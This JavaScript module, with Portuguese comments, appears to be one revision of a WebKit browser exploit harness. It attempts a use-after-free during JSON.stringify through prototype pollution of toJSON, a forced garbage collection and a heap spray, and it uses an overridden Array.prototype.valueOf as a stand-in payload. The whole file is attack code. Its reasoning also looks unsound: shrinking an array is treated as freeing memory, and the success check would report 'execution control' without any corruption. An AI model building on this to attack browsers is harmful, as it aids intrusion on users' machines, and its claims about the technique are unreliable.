// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R69 - Correção de Referência)
// =======================================================================================
// O R68 falhou devido a um erro de referência (variável não definida), um erro meu.
// ESTA VERSÃO CORRIGE a chamada da variável, permitindo que a estratégia
// de UAF com JSON.stringify seja finalmente executada.
// A lógica de exploração é a mesma do R68.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';

// *** MUDANÇA R69: O nome do módulo foi atualizado ***
export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R69_JSON_UAF";

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (R69)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    // *** MUDANÇA R69: Corrigido o nome da variável para usar a constante exportada ***
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: UAF com JSON.stringify (R69) ---`, "test");
    
    let final_result = { success: false, message: "A cadeia UAF não obteve sucesso." };
    let original_toJSON = Object.prototype.toJSON;
    let original_valueOf = Array.prototype.valueOf;

    // Variável global para confirmar a execução do nosso payload
    window.pwned_success = false;

    try {
        // --- FASE 1: Preparar o Payload e os Objetos da Armadilha ---
        logS3("--- FASE 1: Preparando o Payload e a Armadilha ---", "subtest");
        
        // O payload que será executado se o exploit funcionar
        Array.prototype.valueOf = function() {
            logS3("++++++++++++ PAYLOAD EXECUTADO! CONTROLE DE EXECUÇÃO OBTIDO! ++++++++++++", "vuln");
            window.pwned_success = true;
            // Retorna um valor primitivo para o stringifier não reclamar
            return "[object Array]"; 
        };

        const uaf_victim = { id: 'victim' };
        const trigger_obj = { id: 'trigger' };
        const uaf_array = [trigger_obj, uaf_victim];
        const spray_arrays = [];
        
        // --- FASE 2: Definir o Gatilho 'toJSON' (Prototype Pollution) ---
        logS3("--- FASE 2: Definindo o Gatilho 'toJSON' ---", "subtest");
        Object.prototype.toJSON = function() {
            if (this.id === 'trigger') {
                logS3("    Gatilho toJSON ativado! Liberando o objeto vítima...", "info");
                uaf_array.length = 1; // Libera 'uaf_victim' tornando-o elegível para GC

                // Força o GC e pulveriza a memória com nosso payload
                triggerGC_Tamed_Sync(); 
                for (let i = 0; i < 100; i++) {
                    spray_arrays.push([1.1]);
                }
                logS3("    GC e Spray concluídos. O UAF deve ocorrer agora.", "warn");
            }
            // Retorna um valor simples para o stringifier
            return this.id;
        };

        // --- FASE 3: Acionar o Exploit ---
        logS3("--- FASE 3: Acionando JSON.stringify para iniciar o UAF ---", "subtest");
        try {
            JSON.stringify(uaf_array);
        } catch(e) {
            logS3(`    JSON.stringify lançou um erro esperado: ${e.message}`, "info");
        }

        // --- FASE 4: Verificação ---
        logS3("--- FASE 4: Verificando o resultado ---", "subtest");
        if (window.pwned_success) {
            final_result = { success: true, message: "UAF com JSON.stringify bem-sucedido. Controle de execução obtido!" };
            logS3("++++++++++++ SUCESSO TOTAL! A ESTRATÉGIA FUNCIONOU! ++++++++++++", "vuln");
        } else {
            throw new Error("O payload 'valueOf' não foi executado. O UAF falhou.");
        }

    } catch (e) {
        final_result.message = `Exceção na cadeia de exploração: ${e.message}`;
        logS3(final_result.message, "critical");
    } finally {
        // --- FASE 5: Limpeza ---
        logS3("--- FASE 5: Limpando protótipos... ---", "subtest");
        Object.prototype.toJSON = original_toJSON;
        Array.prototype.valueOf = original_valueOf;
        delete window.pwned_success;
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return { errorOccurred: final_result.success ? null : final_result.message, addrof_result: final_result };
}

// --- Funções Auxiliares ---

// Versão síncrona do GC para ser chamada de dentro do toJSON
function triggerGC_Tamed_Sync() {
    try {
        const gc_trigger_arr = [];
        for (let i = 0; i < 500; i++) {
            gc_trigger_arr.push(new ArrayBuffer(1024 * (i % 256 + 1))); 
        }
    } catch (e) { /* ignora */ }
}
